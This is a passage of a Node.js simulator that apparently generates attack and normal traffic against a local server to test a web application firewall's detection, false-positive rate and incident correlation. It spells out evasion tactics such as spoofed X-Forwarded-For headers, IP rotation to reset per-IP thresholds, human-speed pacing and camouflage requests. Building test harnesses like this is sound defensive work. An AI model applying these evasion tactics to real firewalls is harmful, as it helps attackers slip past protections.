    const req = http.request(options, (res) => {
      res.resume();
      res.on("end", () => resolve({ status: res.statusCode }));
    });

    req.on("error", () => resolve({ status: 0 }));
    req.setTimeout(4_000, () => { req.destroy(); resolve({ status: 0 }); });

    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

// ─── AttackerSession ──────────────────────────────────────────────────────────
//
// NEW: useEvasion flag.  When true, the session mixes in evasion payload variants
//      (e.g. after a few requests get 403'd, a real attacker would start mutating
//       their payloads).  This is what makes precision < 100%.

class AttackerSession {
  constructor(attackType, { useEvasion = false } = {}) {
    const profile      = ATTACK_PROFILES[attackType];
    this.id            = uuidv4();
    this.attackType    = attackType;
    this.profile       = profile;
    this.ip            = randomIP();
    this.userAgent     = pick(profile.userAgents);
    this.maxRequests   = randInt(profile.minRequests, profile.maxRequests);
    this.requestsMade  = 0;
    this.useEvasion    = useEvasion && (profile.evasionRequests || []).length > 0;
    this.blockedCount  = 0;  // track consecutive 403s — triggers evasion mode
    this.interval      = randInt(profile.minInterval, profile.maxInterval);
    this.nextFireAt    = Date.now() + randInt(0, 2_000);
    this.burstCount    = profile.burstCount || 1;
    this._burstTemplate = null;
    this._burstRemaining = 0;
  }

  get isExpired() { return this.requestsMade >= this.maxRequests; }
  get shouldFire() { return !this.isExpired && Date.now() >= this.nextFireAt; }

  async fire() {
    this.requestsMade++;
    this.nextFireAt = Date.now() + randInt(this.profile.minInterval, this.profile.maxInterval);

    // Burst mode: repeat same template N times (ensures threshold is exceeded)
    let template;
    if (this._burstRemaining > 0) {
      template = this._burstTemplate;
      this._burstRemaining--;
    } else {
      // After being blocked a few times, switch to evasion payloads
      const useEvasionNow = this.useEvasion && this.blockedCount >= 2;
      const pool = useEvasionNow
        ? [...this.profile.evasionRequests, ...this.profile.requests]
        : this.profile.requests;

      template = pick(pool);

      // Start a new burst
      if (this.burstCount > 1) {
        this._burstTemplate  = template;
        this._burstRemaining = this.burstCount - 1;
      }
    }

    const result = await fireRequest({
      ...template,
      spoofedIP:  this.ip,
      userAgent:  this.userAgent,
    });

    if (result.status === 403) this.blockedCount++;
    return result;
  }
}

// ─── StealthAttackerSession ───────────────────────────────────────────────────
//
// NEW: A human-speed attacker who uses a real browser UA and varies their IP
//      between requests.  These are harder for the WAF to block and produce
//      more false-negative-looking traffic (requests that reach the app because
//      the WAF hasn't accumulated enough threshold hits yet from this "user").

class StealthAttackerSession {
  constructor(attackType) {
    const profile      = ATTACK_PROFILES[attackType];
    this.id            = uuidv4();
    this.attackType    = attackType;
    this.profile       = profile;
    // Human browser UA — WAF may not flag as scanner
    this.userAgent     = pick(NORMAL_AGENTS);
    this.maxRequests   = randInt(6, 14);   // few requests — stays under radar
    this.requestsMade  = 0;
    // Human-speed intervals: 5-25 seconds between requests
    this.nextFireAt    = Date.now() + randInt(2_000, 8_000);
    // Rotate IP after every 2-3 requests to reset per-IP threshold counters
    this._ip           = randomIP();
    this._ipRequestCount = 0;
    this._ipRotateAfter  = randInt(2, 4);
  }

  get isExpired() { return this.requestsMade >= this.maxRequests; }
  get shouldFire() { return !this.isExpired && Date.now() >= this.nextFireAt; }

  get ip() {
    if (this._ipRequestCount >= this._ipRotateAfter) {
      this._ip = randomIP();
      this._ipRequestCount = 0;
      this._ipRotateAfter = randInt(2, 4);
    }
    return this._ip;
  }

  async fire() {
    this.requestsMade++;
    this._ipRequestCount++;
    // Human-speed pacing
    this.nextFireAt = Date.now() + randInt(5_000, 25_000);

    // Mix: some real-looking normal requests + one attack payload per burst
    // so the IP looks like a normal user until the attack request fires
    const isAttackRequest = Math.random() < 0.4;  // 40% of requests are actual attacks
    let template;

    if (isAttackRequest && this.profile.evasionRequests.length > 0) {
      // Stealth attackers prefer evasion payloads
      template = pick(this.profile.evasionRequests);
    } else if (isAttackRequest) {
      template = pick(this.profile.requests);
    } else {
      // Camouflage: fire a normal-looking request to pad the session's traffic
      template = { method: "GET", path: pick(NORMAL_REQUESTS).path, queryPayload: null, payload: null };
    }

    return fireRequest({
      ...template,
      spoofedIP:  this.ip,
      userAgent:  this.userAgent,
    });
  }
}

// ─── MultiPhaseAttacker ───────────────────────────────────────────────────────
//
// NEW: Simulates a real attack chain: recon first, then the targeted attack.
//      This matches real attacker behaviour (enumerate first, then exploit).
//      The WAF sees recon alerts → attack alerts from the same IP, which also
//      helps test the incident correlation engine.

class MultiPhaseAttacker {
  constructor(attackType) {
    this.id          = uuidv4();
    this.attackType  = attackType;
    this.ip          = randomIP();
    this.userAgent   = pick(ATTACK_PROFILES["Recon"].userAgents);
    this.phase       = "recon";  // recon → attack
    this.maxRequests = randInt(6, 12);   // recon budget
    this.attackSession = null;
    this.requestsMade  = 0;
    this.nextFireAt    = Date.now() + randInt(0, 3_000);
  }

  get isExpired() {
    if (this.phase === "recon") return this.requestsMade >= this.maxRequests;
    return this.attackSession ? this.attackSession.isExpired : true;
  }

  get shouldFire() {
    if (this.isExpired) return false;
    return Date.now() >= this.nextFireAt;
  }

  async fire() {
    if (this.phase === "recon") {
      this.requestsMade++;
      this.nextFireAt = Date.now() + randInt(500, 2_000);

      const template = pick(ATTACK_PROFILES["Recon"].requests);
      const result   = await fireRequest({
        ...template,
        spoofedIP:  this.ip,
        userAgent:  this.userAgent,
        extraHeaders: null,
      });

      // Transition to attack phase after recon budget exhausted
      if (this.requestsMade >= this.maxRequests) {
        this.phase = "attack";
        this.attackSession = new AttackerSession(this.attackType, { useEvasion: true });
        // Reuse same IP so WAF correlates recon + attack to the same source
        this.attackSession.ip = this.ip;
        console.log(
          `🎯  [Simulator] MultiPhase ${this.ip}: recon done → pivoting to ${this.attackType}`
        );
      }

      return result;
    }

    // Attack phase: delegate to the inner AttackerSession
    if (this.attackSession && !this.attackSession.isExpired) {
      this.nextFireAt = Date.now() + randInt(
        this.attackSession.profile.minInterval,
        this.attackSession.profile.maxInterval
      );
      return this.attackSession.fire();
    }

    return { status: 0 };
  }
}

// ─── NormalUserSession ────────────────────────────────────────────────────────

class NormalUserSession {
  constructor() {
    this.id           = uuidv4();
    this.ip           = randomIP();
    this.userAgent    = pick(NORMAL_AGENTS);
    this.maxRequests  = randInt(5, 20);
    this.requestsMade = 0;
    this.nextFireAt   = Date.now() + randInt(0, 4_000);
  }

  get isExpired() { return this.requestsMade >= this.maxRequests; }
  get shouldFire() { return !this.isExpired && Date.now() >= this.nextFireAt; }

  async fire() {
    this.requestsMade++;
    this.nextFireAt = Date.now() + randInt(3_000, 12_000);

    const template = pick(NORMAL_REQUESTS);
    await fireRequest({
      method:       template.method,
      path:         template.path,
      queryPayload: null,
      payload:      null,
      bodyKey:      null,
      extraBody:    null,
      extraHeaders: null,
      spoofedIP:    this.ip,
      userAgent:    this.userAgent,
    });
  }
}

// ─── FalsePositiveSession ─────────────────────────────────────────────────────
//
// NEW: Normal users submitting legitimate content that looks suspicious.
//      These are the requests that cause WAF false positives — a signature WAF
//      blocks O'Brien because it sees a SQLi pattern even though the user is
//      just filling in their name.
//
//      This makes your false-positive rate > 0% which is realistic — no real
//      WAF has 0% FP without being completely useless.

class FalsePositiveSession {
  constructor() {
    this.id           = uuidv4();
    this.ip           = randomIP();
    this.userAgent    = pick(BORDERLINE_AGENTS);
    this.maxRequests  = randInt(2, 6);
    this.requestsMade = 0;
    // Less frequent — these edge cases don't happen every second
    this.nextFireAt   = Date.now() + randInt(3_000, 15_000);
  }

  get isExpired() { return this.requestsMade >= this.maxRequests; }
  get shouldFire() { return !this.isExpired && Date.now() >= this.nextFireAt; }

  async fire() {
    this.requestsMade++;
    // Real users aren't firing constantly
    this.nextFireAt = Date.now() + randInt(8_000, 30_000);

    const template = pick(BORDERLINE_NORMAL_REQUESTS);
    await fireRequest({
      method:       template.method,
      path:         template.path,
      queryPayload: template.queryPayload || null,
      payload:      template.payload || null,
      bodyKey:      template.bodyKey || null,
      extraBody:    null,
      extraHeaders: null,
      spoofedIP:    this.ip,
      userAgent:    this.userAgent,
      extraHeaders: { "X-Sim-Session-Type": "false-positive" },
    });
  }
}

// ─── Session pool ─────────────────────────────────────────────────────────────

const attackers      = new Set();
const normals        = new Set();
const stealthers     = new Set();
const falsePositives = new Set();
const multiPhase     = new Set();

const ATTACK_TYPES = Object.keys(ATTACK_PROFILES);

const MAX_CONCURRENT_MULTI_PHASE    = 2;
const MAX_CONCURRENT_FALSE_POSITIVE = 2;

function spawnAttacker() {
  const type    = pick(ATTACK_TYPES);
  // 40% of attackers use evasion mode
  const session = new AttackerSession(type, { useEvasion: Math.random() < 0.4 });
  attackers.add(session);
  console.log(
    `🎯  [Simulator] New ${type} campaign  ip=${session.ip}  ` +
    `budget=${session.maxRequests}  evasion=${session.useEvasion}`
  );
}

function spawnStealth() {
  const type    = pick(ATTACK_TYPES.filter(t => t !== "DDoS")); // stealth ≠ DDoS
  const session = new StealthAttackerSession(type);
  stealthers.add(session);
  console.log(`🥷  [Simulator] New stealth ${type} session  ip=${session._ip}`);
}

function spawnMultiPhase() {
  const type    = pick(["SQLi", "XSS", "RCE", "SSRF", "Path Traversal"]);
  const session = new MultiPhaseAttacker(type);
  multiPhase.add(session);
  console.log(`🔗  [Simulator] New multi-phase campaign → ${type}  ip=${session.ip}`);
}

function spawnNormal() {
  normals.add(new NormalUserSession());
}

function spawnFalsePositive() {
  falsePositives.add(new FalsePositiveSession());
}

// ─── Main tick ────────────────────────────────────────────────────────────────

async function tick() {
  // Expire finished sessions
  for (const s of attackers)      { if (s.isExpired) { attackers.delete(s);      console.log(`✅  [Simulator] ${s.attackType} campaign ended  ip=${s.ip}`); } }
  for (const s of stealthers)     { if (s.isExpired)   stealthers.delete(s); }
  for (const s of normals)        { if (s.isExpired)   normals.delete(s); }
  for (const s of falsePositives) { if (s.isExpired)   falsePositives.delete(s); }
  for (const s of multiPhase)     { if (s.isExpired) { multiPhase.delete(s); console.log(`✅  [Simulator] MultiPhase → ${s.attackType} ended  ip=${s.ip}`); } }

  // Top up all pools
  while (attackers.size      < MAX_CONCURRENT_ATTACKERS)     spawnAttacker();
  while (normals.size        < MAX_CONCURRENT_NORMALS)       spawnNormal();
  while (stealthers.size     < MAX_CONCURRENT_STEALTH)       spawnStealth();
  while (falsePositives.size < MAX_CONCURRENT_FALSE_POSITIVE) spawnFalsePositive();
  while (multiPhase.size     < MAX_CONCURRENT_MULTI_PHASE)    spawnMultiPhase();

  // Collect ready sessions across all pools
  const allReady = [
    ...[...attackers].filter(s => s.shouldFire),
    ...[...normals].filter(s => s.shouldFire),
    ...[...stealthers].filter(s => s.shouldFire),
    ...[...falsePositives].filter(s => s.shouldFire),
    ...[...multiPhase].filter(s => s.shouldFire),
  ];

  // Circuit-breaker
  const toFire = allReady.slice(0, MAX_REQUESTS_PER_TICK);
  await Promise.allSettled(toFire.map(s => s.fire().catch(() => {})));
}

// ─── Public API ───────────────────────────────────────────────────────────────

let simulatorInterval = null;

function startSimulator() {
  if (simulatorInterval) return;

  console.log("🔄  Traffic Simulator v4 started (evasion-aware, FP-generating, multi-phase)");
  console.log(`    └─ Requests go to http://${SERVER_HOST}:${SERVER_PORT}`);
  console.log(`    └─ X-Forwarded-For spoofing per session`);
  console.log(`    └─ WAF handles detection, thresholds, and DB writes`);
  console.log(`    └─ ${MAX_CONCURRENT_ATTACKERS} standard attackers (40% evasion mode)`);
  console.log(`    └─ ${MAX_CONCURRENT_STEALTH} stealth attackers (human-speed, IP rotation)`);
  console.log(`    └─ ${MAX_CONCURRENT_MULTI_PHASE} multi-phase attackers (recon → exploit)`);
  console.log(`    └─ ${MAX_CONCURRENT_NORMALS} normal users + ${MAX_CONCURRENT_FALSE_POSITIVE} borderline-normal users (FP generators)`);
  console.log(`    └─ Attack types: ${ATTACK_TYPES.join(", ")}`);

  // Seed immediately
  for (let i = 0; i < MAX_CONCURRENT_ATTACKERS;     i++) spawnAttacker();
  for (let i = 0; i < MAX_CONCURRENT_NORMALS;       i++) spawnNormal();
  for (let i = 0; i < MAX_CONCURRENT_STEALTH;       i++) spawnStealth();
  for (let i = 0; i < MAX_CONCURRENT_FALSE_POSITIVE; i++) spawnFalsePositive();
  for (let i = 0; i < MAX_CONCURRENT_MULTI_PHASE;    i++) spawnMultiPhase();

  simulatorInterval = setInterval(async () => {
    try { await tick(); }
    catch (err) { console.error("Simulator tick error:", err.message); }
  }, TICK_INTERVAL_MS);
}

function stopSimulator() {
  if (!simulatorInterval) return;
  clearInterval(simulatorInterval);
  simulatorInterval = null;
  attackers.clear();
  normals.clear();
  stealthers.clear();
  falsePositives.clear();
  multiPhase.clear();
  console.log("⏹  Traffic Simulator v4 stopped");
}

async function generateLiveEvent() {
  const type    = pick(ATTACK_TYPES);
  const session = new AttackerSession(type);
  await session.fire();
}

module.exports = { startSimulator, stopSimulator, generateLiveEvent, simulatorInterval };
